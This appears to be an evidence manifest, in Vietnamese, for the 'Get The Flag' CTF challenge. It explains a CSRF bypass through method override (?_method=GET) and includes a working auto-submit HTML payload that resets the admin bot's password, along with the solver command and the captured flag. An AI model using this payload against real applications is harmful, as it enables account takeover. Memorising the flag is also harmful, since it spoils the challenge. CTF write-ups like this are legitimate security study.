# Evidence manifest — Get The Flag

| File | Claim supported | Source/tool | Reproduction | Why kept |
|---|---|---|---|---|
| ../exploit.py | Chuỗi khai thác CSRF-bypass hoàn chỉnh: register→upload→report→login admin→/flag | Python requests | `python solve/exploit.py <instance_url>` | Solver tái lập được |
| run_transcript.txt | Bằng chứng exploit chạy trên instance chính thức, đọc được flag | stdout của exploit.py | như trên | Xác minh flag từ server |

## Lỗ hổng (từ app.js)

- `methodOverride` (app.use, chạy trước route) ghi đè `req.method` theo `?_method=`.
- `csrfOnPostOnly` chỉ kiểm tra CSRF khi `req.method === "POST"`.
- Gửi **POST** `/account/change-password?_method=GET` → `req.method` thành `GET` → **bỏ qua CSRF**, nhưng handler vẫn thấy `req.body.password` nên đổi mật khẩu của session hiện tại.
- Bot admin (`bot.js`) đăng nhập `admin` rồi mở trang `/pages/<uuid>.html` ta upload → form auto-submit đổi mật khẩu admin.
- `/flag` chỉ trả FLAG khi `user.role === "admin"`.

## Payload (chạy trong trình duyệt bot admin)

```html
<form id="f" action="/account/change-password?_method=GET" method="POST">
<input name="password" value="Pwned_admin_123">
<input name="confirm" value="Pwned_admin_123">
</form><script>document.forms[0].submit()</script>
```

## Kết quả xác minh

- Chạy `python solve/exploit.py https://get-the-flag-<id>.instances.ctf.l3ak.team`
- Đăng nhập admin bằng mật khẩu vừa đặt → `GET /flag` trả:
  **`L3AK{m37h0D_0V3rRide_c5Rf_Bypass_g0_bRRRR}`**
- Verify mạnh: flag lấy trực tiếp từ endpoint `/flag` gated-admin trên **server challenge chính thức**, qua chuỗi exploit tái lập được.

Artifact gốc: `files/get-the-flag.zip` — SHA-256 `1ad2664bc063d561c37eaa5a1c69815392f696f5f7891a4b2217739cc5cdd661`
